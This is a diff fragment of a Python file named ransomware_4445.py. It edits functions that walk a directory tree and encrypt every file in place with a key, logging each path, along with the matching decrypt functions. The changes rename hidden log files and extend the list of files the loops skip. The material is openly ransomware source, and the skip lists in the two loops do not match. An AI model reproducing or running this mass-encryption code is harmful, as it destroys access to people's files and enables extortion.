@@ -67,14 +67,14 @@ def encrypt_specific_file(file,key):
 
 	with open(file, "wb") as encryptedFile:
 		encryptedFile.write(encrypted_data)
-	with open("./.encrypted.log", "a") as log:
+	with open("./.encrypted_4445.log", "a") as log:
 		log.write(file + "\n")
 
 
 def encrypt_directory(path, key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
-			if(file== "ransomware_4445.py" or file == "encryption_key_4445.key"):
+			if(file== "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
 				continue
 			file_path = os.path.join(root, file)
 			encrypt_specific_file(file_path, key)
@@ -87,14 +87,14 @@ def decrypt_specific_file(file,key):
 
 	with open(file, "wb") as encryptedFile:
 		encryptedFile.write(decrypted_data)
-	with open("./.decrypted.log", "a") as log:
+	with open("./.decrypted_4445.log", "a") as log:
 		log.write(file + "\n")
 
 
 def decrypt_directory(path,key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
-			if(file == "ransomware_4445.py" or file == "encryption_key_4445.key"):
+			if(file == "ransomware_4445.py" or file == "encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
 				continue
 			file_path = os.path.join(root,file)
 			decrypt_specific_file(file_path,key)
